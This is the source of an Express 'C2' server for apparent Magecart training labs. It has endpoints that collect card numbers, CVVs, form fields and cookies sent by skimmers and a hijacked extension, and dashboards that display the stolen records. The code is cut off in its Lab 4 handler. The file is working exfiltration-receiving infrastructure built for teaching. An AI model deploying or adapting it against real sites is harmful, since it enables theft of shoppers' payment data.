/**
 * SHARED C2 SERVER
 *
 * Single Express app serving C2 collection endpoints for labs 1-3.
 * Routes are prefixed with /labN/ so Traefik can forward the full path
 * with no strip middleware — this server sees the complete path.
 *
 * Lab 1: /lab1/c2/*   — basic Magecart card skimmer
 * Lab 2: /lab2/c2/*   — DOM-based skimming
 * Lab 3: /lab3/extension/* — browser extension hijacking
 *
 * Data persistence: GCS buckets when LAB*_BUCKET env vars are set;
 * local filesystem otherwise (local development only).
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

const express = require('express')
const cors = require('cors')
const fs = require('fs')
const fsPromises = require('fs').promises
const path = require('path')

const app = express()
const PORT = process.env.PORT || 3000

// Trust the GFE/Cloud Run proxy so req.ip reflects X-Forwarded-For
app.set('trust proxy', true)

// ============================================================
// GCS STORAGE LAYER
// ============================================================

let gcs = null
const BUCKETS = {
  lab1: process.env.LAB1_BUCKET,
  lab2: process.env.LAB2_BUCKET,
  lab3: process.env.LAB3_BUCKET,
  lab4: process.env.LAB4_BUCKET
}

if (BUCKETS.lab1 || BUCKETS.lab2 || BUCKETS.lab3 || BUCKETS.lab4) {
  const { Storage } = require('@google-cloud/storage')
  gcs = new Storage()
  console.log('GCS storage enabled:', BUCKETS)
}

function useGCS(lab) {
  return !!(gcs && BUCKETS[lab])
}

async function gcsSaveJSON(lab, name, data) {
  await gcs.bucket(BUCKETS[lab]).file(name).save(
    JSON.stringify(data, null, 2),
    { contentType: 'application/json', metadata: { cacheControl: 'no-cache' } }
  )
}

async function gcsListJSON(lab, prefix) {
  const [files] = await gcs.bucket(BUCKETS[lab]).getFiles({ prefix })
  return files
}

async function gcsDownloadJSON(file) {
  const [content] = await file.download()
  return JSON.parse(content.toString())
}

// ============================================================
// LOCAL FILE STORAGE (fallback for local dev)
// ============================================================

const DATA_DIRS = {
  lab1: process.env.LAB1_DATA_DIR || '/app/data/lab1',
  lab2: process.env.LAB2_DATA_DIR || '/app/data/lab2',
  lab3: process.env.LAB3_DATA_DIR || '/app/data/lab3',
  lab4: process.env.LAB4_DATA_DIR || '/app/data/lab4'
}

if (!useGCS('lab1') || !useGCS('lab2') || !useGCS('lab3') || !useGCS('lab4')) {
  Object.entries(DATA_DIRS).forEach(([lab, dir]) => {
    if (!useGCS(lab) && !fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true })
    }
  })
}

// ============================================================
// MIDDLEWARE
// ============================================================

app.use(cors())
app.use(express.json({ limit: '10mb' }))
app.use(express.urlencoded({ extended: true, limit: '10mb' }))

// sendBeacon sends Content-Type: text/plain — parse it as JSON body.
app.use((req, res, next) => {
  const bodyEmpty = !req.body || (typeof req.body === 'object' && Object.keys(req.body).length === 0)
  if (req.method === 'POST' && req.is('text/plain') && bodyEmpty) {
    let raw = ''
    req.on('data', chunk => { raw += chunk })
    req.on('end', () => {
      try { req.body = JSON.parse(raw) } catch (_) { req.body = {} }
      next()
    })
  } else {
    next()
  }
})

// ============================================================
// UTILITIES
// ============================================================

function maskCardNumber(cardNumber) {
  if (!cardNumber) return 'N/A'
  const clean = cardNumber.replace(/[\s-]/g, '')
  if (clean.length < 8) return '****'
  return clean.slice(0, 4) + '*'.repeat(clean.length - 8) + clean.slice(-4)
}

function sanitizeForLog(input) {
  if (typeof input !== 'string') input = String(input)
  return input.replace(/[\r\n\t\x00-\x1f\x7f]/g, ' ').substring(0, 500)
}

function uniqueSuffix() {
  return Date.now() + '_' + Math.random().toString(36).substring(2, 7)
}

// ============================================================
// LAB 1: BASIC MAGECART — CARD SKIMMER
// ============================================================

const lab1Stats = { totalRecords: 0, validCards: 0 }

function validateCardData(data) {
  const issues = []
  if (!data.cardNumber) {
    issues.push('Missing card number')
  } else {
    const clean = data.cardNumber.replace(/[\s-]/g, '')
    if (clean.length !== 15 && clean.length !== 16) issues.push('Invalid card number length')
  }
  if (!data.cvv || (data.cvv.length !== 3 && data.cvv.length !== 4)) issues.push('Invalid or missing CVV')
  if (!data.expiry) issues.push('Missing expiry date')
  return { valid: issues.length === 0, issues }
}

async function lab1SaveRecord(data) {
  const name = `stolen_${uniqueSuffix()}`
  if (useGCS('lab1')) {
    await gcsSaveJSON('lab1', `records/${name}.json`, data)
  } else {
    await fsPromises.writeFile(path.join(DATA_DIRS.lab1, `${name}.json`), JSON.stringify(data, null, 2), 'utf8')
  }
  return name
}

async function lab1LoadAllRecords() {
  if (useGCS('lab1')) {
    const files = await gcsListJSON('lab1', 'records/')
    const records = await Promise.all(files.map(f => gcsDownloadJSON(f).catch(() => null)))
    return records.filter(Boolean)
  }
  const files = (await fsPromises.readdir(DATA_DIRS.lab1)).filter(f => f.endsWith('.json'))
  const records = await Promise.all(
    files.map(f => fsPromises.readFile(path.join(DATA_DIRS.lab1, f), 'utf8').then(JSON.parse).catch(() => null))
  )
  return records.filter(Boolean)
}

// POST /lab1/c2/collect — receives stolen card data
app.post('/lab1/c2/collect', async (req, res) => {
  const clientIP = sanitizeForLog(req.ip || req.connection.remoteAddress)
  console.log(`\n[Lab1-C2] 🎯 POST /lab1/c2/collect from ${clientIP}`)

  try {
    const stolenData = req.body
    stolenData.server = {
      receivedAt: new Date().toISOString(),
      clientIP,
      userAgent: req.get('user-agent')
    }

    const validation = validateCardData(stolenData)
    stolenData.validation = validation

    lab1Stats.totalRecords++
    if (validation.valid) {
      lab1Stats.validCards++
      console.log(`[Lab1-C2] ✅ VALID CARD: ${maskCardNumber(stolenData.cardNumber)}`)
    } else {
      console.log(`[Lab1-C2] ⚠️  INCOMPLETE: ${validation.issues.join(', ')}`)
    }

    const name = await lab1SaveRecord(stolenData)
    res.status(200).json({ status: 'ok', id: name })
  } catch (error) {
    console.error('[Lab1-C2] Error:', error)
    res.status(200).json({ status: 'ok' })
  }
})

// GET /lab1/c2/collect — image beacon fallback (base64-encoded data in ?d=)
app.get('/lab1/c2/collect', async (req, res) => {
  console.log('[Lab1-C2] 🎯 Image beacon from:', sanitizeForLog(req.ip || ''))

  try {
    if (req.query.d) {
      const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')
      const stolenData = JSON.parse(decoded)

      if (stolenData && typeof stolenData === 'object') {
        delete stolenData.__proto__
        delete stolenData.constructor
        const cleanData = JSON.parse(JSON.stringify(stolenData))
        Object.setPrototypeOf(cleanData, Object.prototype)

        cleanData.server = {
          receivedAt: new Date().toISOString(),
          clientIP: sanitizeForLog(req.ip || ''),
          method: 'image-beacon'
        }

        lab1Stats.totalRecords++
        await lab1SaveRecord(cleanData)
      }
    }
  } catch (error) {
    console.error('[Lab1-C2] Image beacon error:', error)
  }

  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')
  res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': gif.length })
  res.end(gif)
})

// GET /lab1/c2/ and /lab1/c2 — dashboard
app.get(['/lab1/c2', '/lab1/c2/'], async (req, res) => {
  try {
    const records = await lab1LoadAllRecords()
    records.sort((a, b) => {
      const tA = a.server?.receivedAt || ''
      const tB = b.server?.receivedAt || ''
      return tB.localeCompare(tA)
    })
    res.send(generateLab1Dashboard(records))
  } catch (error) {
    res.status(500).send('Dashboard error')
  }
})

// GET /lab1/c2/api/stolen
app.get('/lab1/c2/api/stolen', async (req, res) => {
  try {
    const records = await lab1LoadAllRecords()
    records.sort((a, b) => {
      const tA = a.server?.receivedAt || ''
      const tB = b.server?.receivedAt || ''
      return tB.localeCompare(tA)
    })
    res.json(records)
  } catch (error) {
    res.status(500).json({ error: 'Error loading stolen data' })
  }
})

// GET /lab1/c2/stats
app.get('/lab1/c2/stats', (req, res) => {
  res.json({ ...lab1Stats, dataDirectory: useGCS('lab1') ? `gs://${BUCKETS.lab1}` : DATA_DIRS.lab1 })
})

// GET /lab1/c2/health
app.get('/lab1/c2/health', (req, res) => {
  res.json({ status: 'operational', lab: 'lab1', timestamp: new Date().toISOString() })
})

function generateLab1Dashboard(records) {
  const recordsHtml = records.map((record, index) => {
    const validation = record.validation || { valid: false, issues: [] }
    const badge = validation.valid
      ? '<span style="color:green">✅ VALID</span>'
      : '<span style="color:orange">⚠️ INCOMPLETE</span>'
    return `
      <div class="stolen-record" style="border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:5px;background:${validation.valid ? '#2a4a2a' : '#4a3a2a'};color:#0f0">
        <h3>Record #${index + 1} ${badge}</h3>
        <p><strong>Received:</strong> ${record.server?.receivedAt || 'Unknown'}</p>
        <p><strong>Card:</strong> ${maskCardNumber(record.cardNumber)}</p>
        <p><strong>CVV:</strong> ${record.cvv || 'N/A'}</p>
        <p><strong>Expiry:</strong> ${record.expiry || 'N/A'}</p>
        <p><strong>Cardholder:</strong> ${record.cardholderName || 'N/A'}</p>
        <p><strong>Email:</strong> ${record.email || 'N/A'}</p>
        <p><strong>Client IP:</strong> ${record.server?.clientIP || 'Unknown'}</p>
        ${!validation.valid ? `<p><strong>Issues:</strong> ${validation.issues.join(', ')}</p>` : ''}
      </div>`
  }).join('')

  return `<!DOCTYPE html><html><head><title>Lab 1 C2 Dashboard</title><meta charset="utf-8">
    <style>body{font-family:'Courier New',monospace;max-width:1000px;margin:0 auto;padding:20px;background:#1a1a1a;color:#0f0}
    h1{color:#0f0;text-align:center;border-bottom:2px solid #0f0;padding-bottom:10px}
    .stats{background:#2a2a2a;padding:15px;margin:20px 0;border-radius:5px;border:1px solid #0f0}
    .warning{background:#8b0000;color:#ffcccc;padding:15px;margin:20px 0;border-radius:5px;text-align:center;font-weight:bold}
    nav a{color:#0f0;margin-right:15px}
    .c2-nav{margin-bottom:15px}.c2-nav a{display:inline-block;padding:8px 16px;margin-right:10px;border:1px solid #0f0;border-radius:4px;color:#0f0;text-decoration:none;font-weight:bold}.c2-nav a:hover{background:#2a2a2a}</style></head><body>
    <h1>⚠️ LAB 1 — MAGECART C2 DASHBOARD ⚠️</h1>
    <div class="warning">🚨 EDUCATIONAL DEMONSTRATION ONLY 🚨<br>Simulates an attacker's card skimmer collection server</div>
    <div class="c2-nav"><a href="/lab1">← Back to Lab</a><a href="/">Home</a></div>
    <nav><a href="/lab1/c2/">Dashboard</a><a href="/lab1/c2/api/stolen">JSON API</a><a href="/lab1/c2/stats">Stats</a><a href="/lab1/c2/health">Health</a></nav>
    <div class="stats"><h2>Statistics</h2>
      <p><strong>Total Records:</strong> <span id="totalRecords">${records.length}</span></p>
      <p><strong>Valid Cards:</strong> ${records.filter(r => r.validation?.valid).length}</p>
    </div>
    <h2>Stolen Credit Card Data</h2>
    <div id="stolenData">
    ${records.length === 0 ? '<p>No data collected yet.</p>' : recordsHtml}
    </div>
  </body></html>`
}

// ============================================================
// LAB 2: DOM-BASED SKIMMING
// ============================================================

let lab2Stats = {
  totalRequests: 0,
  domMonitorSessions: 0,
  formOverlayCaptures: 0,
  shadowDomCaptures: 0,
  uniqueVictims: new Set(),
  startTime: Date.now()
}

if (!useGCS('lab2')) {
  const LAB2_ANALYSIS_DIR = path.join(DATA_DIRS.lab2, 'analysis')
  if (!fs.existsSync(LAB2_ANALYSIS_DIR)) {
    fs.mkdirSync(LAB2_ANALYSIS_DIR, { recursive: true })
  }
}

function lab2AnalyzeAttackData(data) {
  const analysis = { timestamp: Date.now(), attackType: data.type || 'unknown', severity: 'medium', indicators: [], riskScore: 0 }

  switch (data.type) {
    case 'form_submission':
      analysis.attackType = 'dom-monitor'
      analysis.severity = 'high'
      analysis.indicators = ['Form submission interception', 'Card data exfiltration']
      break
    case 'periodic': case 'immediate': case 'session_end':
      analysis.attackType = 'dom-monitor'
      analysis.severity = (data.summary?.keystrokesCount > 100 || data.summary?.fieldsCount > 5) ? 'high' : 'medium'
      analysis.indicators = ['DOM MutationObserver usage', 'Real-time field monitoring']
      break
    case 'form_overlay_capture':
      analysis.attackType = 'form-overlay'
      analysis.severity = 'high'
      analysis.indicators = ['Dynamic form overlay injection', 'Credential harvesting']
      break
    case 'shadow_dom_capture': case 'shadow_session_end':
      analysis.attackType = 'shadow-dom'
      analysis.severity = 'medium'
      analysis.indicators = ['Shadow DOM encapsulation abuse']
      break
  }

  const severityScore = { critical: 90, high: 70, medium: 50, low: 20 }
  analysis.riskScore = Math.min((severityScore[analysis.severity] || 20) + analysis.indicators.length * 5, 100)
  return analysis
}

function lab2UpdateStats(data) {
  lab2Stats.totalRequests++
  lab2Stats.uniqueVictims.add(data.metadata?.userAgent || 'unknown')
  switch (data.type) {
    case 'periodic': case 'immediate': case 'session_end': lab2Stats.domMonitorSessions++; break
    case 'form_overlay_capture': lab2Stats.formOverlayCaptures++; break
    case 'shadow_dom_capture': case 'shadow_session_end': lab2Stats.shadowDomCaptures++; break
  }
}

async function lab2SaveAttackRecord(attackType, data) {
  const enriched = { ...data, serverTimestamp: Date.now(), serverTime: new Date().toISOString(), attackType }
  if (useGCS('lab2')) {
    await gcsSaveJSON('lab2', `submissions/submit_${uniqueSuffix()}.json`, enriched)
  } else {
    const LAB2_STOLEN_FILE = path.join(DATA_DIRS.lab2, 'stolen.json')
    let existing = []
    if (fs.existsSync(LAB2_STOLEN_FILE)) {
      try {
        existing = JSON.parse(fs.readFileSync(LAB2_STOLEN_FILE, 'utf8'))
        if (!Array.isArray(existing)) existing = []
      } catch (_) { existing = [] }
    }
    existing.push(enriched)
    fs.writeFileSync(LAB2_STOLEN_FILE, JSON.stringify(existing, null, 2))
  }
}

async function lab2LoadAllRecords() {
  if (useGCS('lab2')) {
    const files = await gcsListJSON('lab2', 'submissions/')
    const records = await Promise.all(files.map(f => gcsDownloadJSON(f).catch(() => null)))
    return records.filter(Boolean)
  }
  const LAB2_STOLEN_FILE = path.join(DATA_DIRS.lab2, 'stolen.json')
  if (!fs.existsSync(LAB2_STOLEN_FILE)) return []
  try {
    const data = JSON.parse(fs.readFileSync(LAB2_STOLEN_FILE, 'utf8'))
    return Array.isArray(data) ? data : []
  } catch (_) { return [] }
}

// POST /lab2/c2/collect
app.post('/lab2/c2/collect', async (req, res) => {
  try {
    const attackData = req.body
    const clientIp = sanitizeForLog(req.ip || req.connection.remoteAddress || 'unknown')
    const eventType = attackData.type || 'unknown'

    console.log(`\n[Lab2-C2] Received attack data from ${clientIp}, type: ${sanitizeForLog(eventType)}`)

    // Drop noisy heartbeat events — only store events with captured card data
    const noisyTypes = ['periodic', 'immediate', 'session_end']
    if (noisyTypes.includes(eventType)) {
      console.log(`[Lab2-C2] Dropping noisy event type: ${eventType}`)
      return res.json({ success: true, dropped: true })
    }

    lab2UpdateStats(attackData)

    const analysis = lab2AnalyzeAttackData(attackData)
    await lab2SaveAttackRecord(analysis.attackType, attackData)

    // Save analysis as a separate GCS object (or local file)
    if (useGCS('lab2')) {
      await gcsSaveJSON('lab2', `analysis/analysis_${uniqueSuffix()}.json`, analysis)
    } else {
      const analysisPath = path.join(DATA_DIRS.lab2, 'analysis', `analysis_${Date.now()}.json`)
      fs.writeFileSync(analysisPath, JSON.stringify(analysis, null, 2))
    }

    res.json({
      success: true,
      sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9),
      timestamp: Date.now(),
      analysis: { severity: analysis.severity, riskScore: analysis.riskScore }
    })
  } catch (error) {
    console.error('[Lab2-C2] Error:', error.message)
    res.status(500).json({ success: false, error: 'Server error' })
  }
})

// GET /lab2/c2/ and /lab2/c2 — dashboard
app.get(['/lab2/c2', '/lab2/c2/'], async (req, res) => {
  try {
    const records = await lab2LoadAllRecords()
    res.send(generateLab2Dashboard(records))
  } catch (error) {
    res.status(500).send('Dashboard error')
  }
})

// GET /lab2/c2/api/stolen
app.get('/lab2/c2/api/stolen', async (req, res) => {
  try {
    const data = await lab2LoadAllRecords()
    res.json(data)
  } catch (error) {
    res.status(500).json({ error: 'Error fetching data' })
  }
})

// GET /lab2/c2/stats
app.get('/lab2/c2/stats', (req, res) => {
  res.json({
    ...lab2Stats,
    uniqueVictims: lab2Stats.uniqueVictims.size,
    uptime: Date.now() - lab2Stats.startTime
  })
})

// GET /lab2/c2/recent/:n?
app.get('/lab2/c2/recent/:count?', async (req, res) => {
  try {
    const count = parseInt(req.params.count) || 10
    const records = await lab2LoadAllRecords()
    const recent = records.slice(-count).reverse().map(r => ({
      timestamp: r.serverTimestamp || r.timestamp,
      type: r.type
    }))
    res.json(recent)
  } catch (error) {
    res.status(500).json({ error: 'Error fetching data' })
  }
})

// GET /lab2/c2/health
app.get('/lab2/c2/health', (req, res) => {
  res.json({ status: 'healthy', lab: 'lab2', timestamp: Date.now(), uptime: Date.now() - lab2Stats.startTime })
})

function extractCardFields(formData) {
  const result = {}
  if (!formData) return result
  Object.entries(formData).forEach(([fieldId, f]) => {
    const key = (f.fieldName || '') + '|' + fieldId
    const val = f.value || ''
    if (!val) return
    if (/cardNumber|card-number/i.test(key)) result.cardNumber = val
    else if (/cvv|cc-csc/i.test(key)) result.cvv = val
    else if (/cardExpiry|card-expiry/i.test(key)) result.expiry = val
    else if (/cardHolderName|card-holder/i.test(key)) result.name = val
    else if (/billingZip|billing-zip/i.test(key)) result.zip = val
  })
  return result
}

function generateLab2Dashboard(records) {
  const submissions = records.filter(r =>
    r.type === 'form_submission' ||
    (r.formData && Object.values(r.formData).some(f => f && f.value))
  )
  const other = records.filter(r => r.type !== 'form_submission')
  const attackCounts = records.reduce((acc, r) => {
    const type = r.type || 'unknown'
    acc[type] = (acc[type] || 0) + 1
    return acc
  }, {})

  const submissionRows = submissions.slice().reverse().map((r, i) => {
    const card = extractCardFields(r.formData)
    const masked = maskCardNumber(card.cardNumber)
    return `
      <div class="attack-record" style="border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:5px;background:#1e2e1e;color:#0f0">
        <h3>Capture #${i + 1} <span style="color:#0c0">✅ FORM SUBMIT</span></h3>
        <p><strong>Received:</strong> ${r.serverTime || 'unknown'}</p>
        <p><strong>Card Number:</strong> ${masked}</p>
        <p><strong>Cardholder:</strong> ${card.name || 'N/A'}</p>
        <p><strong>Expiry:</strong> ${card.expiry || 'N/A'}</p>
        <p><strong>CVV:</strong> ${card.cvv || 'N/A'}</p>
        <p><strong>ZIP:</strong> ${card.zip || 'N/A'}</p>
        <p><strong>Form:</strong> ${r.formId || 'N/A'}</p>
      </div>`
  }).join('')

  return `<!DOCTYPE html><html><head><title>Lab 2 C2 Dashboard</title><meta charset="utf-8">
    <style>body{font-family:'Courier New',monospace;max-width:1000px;margin:0 auto;padding:20px;background:#1a1a1a;color:#0f0}
    h1{color:#0f0;text-align:center;border-bottom:2px solid #0f0;padding-bottom:10px}
    .stats{background:#2a2a2a;padding:15px;margin:20px 0;border-radius:5px;border:1px solid #0f0}
    .warning{background:#8b0000;color:#ffcccc;padding:15px;margin:20px 0;border-radius:5px;text-align:center;font-weight:bold}
    nav a{color:#0f0;margin-right:15px}
    .c2-nav{margin-bottom:15px}.c2-nav a{display:inline-block;padding:8px 16px;margin-right:10px;border:1px solid #0f0;border-radius:4px;color:#0f0;text-decoration:none;font-weight:bold}.c2-nav a:hover{background:#2a2a2a}
    table{width:100%;border-collapse:collapse}td,th{border:1px solid #0f0;padding:8px;text-align:left}th{background:#2a2a2a}</style></head><body>
    <h1>⚠️ LAB 2 — DOM SKIMMING C2 DASHBOARD ⚠️</h1>
    <div class="warning">🚨 EDUCATIONAL DEMONSTRATION ONLY 🚨<br>Simulates an attacker's DOM-based attack collection server</div>
    <div class="c2-nav"><a href="/lab2">← Back to Lab</a><a href="/">Home</a></div>
    <nav><a href="/lab2/c2/">Dashboard</a><a href="/lab2/c2/api/stolen">JSON API</a><a href="/lab2/c2/stats">Stats</a><a href="/lab2/c2/health">Health</a></nav>
    <div class="stats"><h2>Statistics</h2>
      <p><strong>Total Attacks:</strong> <span id="totalAttacks">${submissions.length}</span></p>
      <p><strong>Total Records:</strong> ${records.length}</p>
      ${Object.entries(attackCounts).map(([t, n]) => `<p><strong>${t}:</strong> ${n}</p>`).join('')}
    </div>
    <h2>Captured Card Data</h2>
    <div id="recentData">
    ${submissions.length === 0 ? '<p>No form submissions captured yet. Submit the banking form to see card data here.</p>' : submissionRows}
    </div>
    ${other.length > 0 ? `<h2>Other Events (${other.length})</h2>
    <table><tr><th>#</th><th>Time</th><th>Type</th><th>Severity</th></tr>
    ${other.slice(-10).reverse().map((r, i) => `<tr><td>${i + 1}</td><td>${r.serverTime || 'unknown'}</td><td>${r.type || 'unknown'}</td><td>${r.severity || 'N/A'}</td></tr>`).join('')}
    </table>` : ''}
  </body></html>`
}

// ============================================================
// LAB 3: BROWSER EXTENSION HIJACKING
// ============================================================

let lab3CollectedData = []
let lab3Stats = {
  totalSessions: 0,
  totalFields: 0,
  totalForms: 0,
  totalCookies: 0,
  startTime: Date.now()
}

function generateDataId() {
  return 'data_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
}

function lab3UpdateStats(analysis) {
  lab3Stats.totalSessions++
  lab3Stats.totalFields += analysis.sensitiveFieldCount || 0
  lab3Stats.totalForms += analysis.formCount || 0
  lab3Stats.totalCookies += analysis.cookieCount || 0
}

function lab3AnalyzePayload(payload) {
  const analysis = {
    dataTypes: [],
    sensitiveFieldCount: 0,
    sensitiveFingdings: [],
    riskLevel: 'low',
    formCount: 0,
    cookieCount: 0
  }

  if (!payload || !payload.data) return analysis

  payload.data.forEach(item => {
    if (!analysis.dataTypes.includes(item.type)) analysis.dataTypes.push(item.type)

    if (item.type === 'form_submission' && item.data?.fields) {
      analysis.formCount++
      item.data.fields.forEach(field => {
        const name = (field.name || '').toLowerCase()
        if (field.type === 'password' || name.includes('password')) {
          analysis.sensitiveFieldCount++
          analysis.sensitiveFingdings.push({ type: 'Password', description: `Password field: ${field.name}` })
        } else if (name.includes('card') || name.includes('credit') || name.includes('cvv')) {
          analysis.sensitiveFieldCount++
          analysis.sensitiveFingdings.push({ type: 'Credit Card', description: `Card field: ${field.name}` })
        }
      })
    }

    if (item.type === 'cookies' && item.data?.cookies) {
      analysis.cookieCount += item.data.cookies.length
    }
  })

  if (analysis.sensitiveFingdings.length >= 5) analysis.riskLevel = 'critical'
  else if (analysis.sensitiveFingdings.length >= 3) analysis.riskLevel = 'high'
  else if (analysis.sensitiveFingdings.length >= 1) analysis.riskLevel = 'medium'

  return analysis
}

async function lab3SaveEntry(dataEntry) {
  if (useGCS('lab3')) {
    await gcsSaveJSON('lab3', `sessions/${dataEntry.id}.json`, dataEntry)
  } else {
    const today = new Date().toISOString().split('T')[0]
    const logFile = path.join(DATA_DIRS.lab3, `extension-data-${today}.log`)
    const logEntry = {
      timestamp: dataEntry.timestamp,
      id: dataEntry.id,
      clientIP: dataEntry.clientIP,
      url: dataEntry.payload?.url,
      sessionId: dataEntry.payload?.sessionId,
      riskLevel: dataEntry.analysis.riskLevel,
      dataTypes: dataEntry.analysis.dataTypes,
      sensitiveCount: dataEntry.analysis.sensitiveFieldCount
    }
    await fsPromises.appendFile(logFile, JSON.stringify(logEntry) + '\n')

    const dataFile = path.join(DATA_DIRS.lab3, `full-data-${today}.json`)
    let existingData = []
    try {
      const existing = await fsPromises.readFile(dataFile, 'utf8')
      existingData = JSON.parse(existing)
    } catch (_) {}
    existingData.push(dataEntry)
    await fsPromises.writeFile(dataFile, JSON.stringify(existingData, null, 2))
  }
}

// On startup, preload lab3 data from GCS into memory
async function lab3Preload() {
  if (!useGCS('lab3')) return
  try {
    const files = await gcsListJSON('lab3', 'sessions/')
    const entries = await Promise.all(files.map(f => gcsDownloadJSON(f).catch(() => null)))
    lab3CollectedData = entries.filter(Boolean)
    console.log(`[Lab3-C2] Preloaded ${lab3CollectedData.length} sessions from GCS`)
  } catch (err) {
    console.error('[Lab3-C2] GCS preload failed:', err.message)
  }
}

// POST /lab3/extension/stolen-data — receives extension-captured data
app.post('/lab3/extension/stolen-data', async (req, res) => {
  try {
    const timestamp = new Date().toISOString()
    const clientIP = sanitizeForLog(req.ip || req.connection.remoteAddress || 'unknown')

    console.log(`\n[Lab3-C2] Extension data received from ${clientIP}`)

    let payload = req.body
    if (typeof payload === 'string') {
      try { payload = JSON.parse(payload) } catch (_) { payload = { raw: payload } }
    }

    const analysis = lab3AnalyzePayload(payload)

    const dataEntry = {
      timestamp,
      clientIP,
      userAgent: req.get('User-Agent'),
      payload,
      analysis,
      id: generateDataId()
    }

    lab3CollectedData.push(dataEntry)
    lab3UpdateStats(analysis)

    if (lab3CollectedData.length > 1000) lab3CollectedData = lab3CollectedData.slice(-1000)

    await lab3SaveEntry(dataEntry)

    res.status(200).json({ success: true, message: 'Data received', dataId: dataEntry.id, timestamp })
  } catch (error) {
    console.error('[Lab3-C2] Error:', error)
    res.status(500).json({ success: false, message: 'Server error', error: error.message })
  }
})

// GET /lab3/extension/ and /lab3/extension — dashboard
app.get(['/lab3/extension', '/lab3/extension/'], (req, res) => {
  res.send(generateLab3Dashboard())
})

// GET /lab3/extension/api/data
app.get('/lab3/extension/api/data', (req, res) => {
  res.json({
    success: true,
    count: lab3CollectedData.length,
    data: lab3CollectedData,
    stats: lab3Stats
  })
})

// GET /lab3/extension/status
app.get('/lab3/extension/status', (req, res) => {
  const uptime = Date.now() - lab3Stats.startTime
  res.json({
    server: 'Extension Data Collection Server (shared-c2)',
    lab: 'lab3',
    status: 'active',
    uptime: `${Math.floor(uptime / 3600000)}h ${Math.floor((uptime % 3600000) / 60000)}m`,
    stats: {
      ...lab3Stats,
      recentSessions: lab3CollectedData.slice(-10).map(e => ({
        id: e.id,
        timestamp: e.timestamp,
        url: e.payload?.url,
        riskLevel: e.analysis.riskLevel,
        dataTypes: e.analysis.dataTypes
      }))
    }
  })
})

// GET /lab3/extension/health
app.get('/lab3/extension/health', (req, res) => {
  res.json({ status: 'healthy', lab: 'lab3', timestamp: new Date().toISOString(), version: '1.0.0' })
})

function generateLab3Dashboard() {
  const recent = lab3CollectedData.slice(-20).reverse()
  const rows = recent.map((e, i) => `
    <tr><td>${i + 1}</td><td>${e.timestamp}</td><td>${e.payload?.url || 'Unknown'}</td>
    <td>${e.analysis.riskLevel}</td><td>${e.analysis.dataTypes.join(', ')}</td></tr>`).join('')

  return `<!DOCTYPE html><html><head><title>Lab 3 Extension C2 Dashboard</title><meta charset="utf-8">
    <style>body{font-family:'Courier New',monospace;max-width:1000px;margin:0 auto;padding:20px;background:#1a1a1a;color:#0f0}
    h1{color:#0f0;text-align:center;border-bottom:2px solid #0f0;padding-bottom:10px}
    .stats{background:#2a2a2a;padding:15px;margin:20px 0;border-radius:5px;border:1px solid #0f0}
    .warning{background:#8b0000;color:#ffcccc;padding:15px;margin:20px 0;border-radius:5px;text-align:center;font-weight:bold}
    nav a{color:#0f0;margin-right:15px}
    .c2-nav{margin-bottom:15px}.c2-nav a{display:inline-block;padding:8px 16px;margin-right:10px;border:1px solid #0f0;border-radius:4px;color:#0f0;text-decoration:none;font-weight:bold}.c2-nav a:hover{background:#2a2a2a}
    table{width:100%;border-collapse:collapse}td,th{border:1px solid #0f0;padding:8px;text-align:left}th{background:#2a2a2a}</style></head><body>
    <h1>⚠️ LAB 3 — EXTENSION HIJACKING C2 DASHBOARD ⚠️</h1>
    <div class="warning">🚨 EDUCATIONAL DEMONSTRATION ONLY 🚨<br>Simulates an attacker's extension data collection server</div>
    <div class="c2-nav"><a href="/lab3">← Back to Lab</a><a href="/">Home</a></div>
    <nav><a href="/lab3/extension/">Dashboard</a><a href="/lab3/extension/api/data">JSON API</a><a href="/lab3/extension/status">Status</a><a href="/lab3/extension/health">Health</a></nav>
    <div class="stats"><h2>Statistics</h2>
      <p><strong>Total Sessions:</strong> ${lab3Stats.totalSessions}</p>
      <p><strong>Sensitive Fields:</strong> ${lab3Stats.totalFields}</p>
      <p><strong>Forms Captured:</strong> ${lab3Stats.totalForms}</p>
      <p><strong>Cookies Harvested:</strong> ${lab3Stats.totalCookies}</p>
    </div>
    <h2>Recent Sessions (last 20)</h2>
    ${lab3CollectedData.length === 0 ? '<p>No data collected yet.</p>' : `
    <table><tr><th>#</th><th>Time</th><th>URL</th><th>Risk</th><th>Data Types</th></tr>
    ${rows}</table>`}
  </body></html>`
}

// ============================================================
// SHARED HEALTH
// ============================================================

app.get('/health', (req, res) => {
  res.json({ status: 'healthy', service: 'shared-c2', timestamp: new Date().toISOString() })
})

// ============================================================
// LAB 4 — STEGANOGRAPHY FAVICON C2
// Receives card data exfiltrated by the stego skimmer hidden
// in favicon.ico. Payload fields: card_number, card_name,
// expiry, cvv, source, timestamp, url.
// ============================================================

let lab4Records = []
let lab4Stats = { totalRecords: 0, startTime: Date.now() }

async function lab4SaveRecord(record) {
  if (useGCS('lab4')) {
    await gcsSaveJSON('lab4', `records/${record.id}.json`, record)
  } else {
    await fsPromises.writeFile(
      path.join(DATA_DIRS.lab4, `${record.id}.json`),
      JSON.stringify(record, null, 2)
    )
  }
}

async function lab4Preload() {
  if (!useGCS('lab4')) return
  try {
    const files = await gcsListJSON('lab4', 'records/')
    const entries = await Promise.all(files.map(f => gcsDownloadJSON(f).catch(() => null)))
    lab4Records = entries.filter(Boolean)
    lab4Stats.totalRecords = lab4Records.length
    console.log(`[Lab4-C2] Preloaded ${lab4Records.length} records from GCS`)
  } catch (e) {
    console.error('[Lab4-C2] Preload error:', e.message)
  }
}

// POST /lab4/c2/collect — skimmer sends stolen card data
app.post('/lab4/c2/collect', async (req, res) => {
  const ts = new Date().toISOString()
  const body = req.body || {}

  const rawCard = String(body.card_number || '').replace(/[\s-]/g, '')
  const maskedCard = rawCard.length >= 8
    ? rawCard.slice(0, 4) + ' **** **** ' + rawCard.slice(-4)
    : '****'

  const record = {
    id: `stego-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    timestamp: ts,
    masked_card: maskedCard,
    cvv: body.cvv,
    card_name: body.card_name,
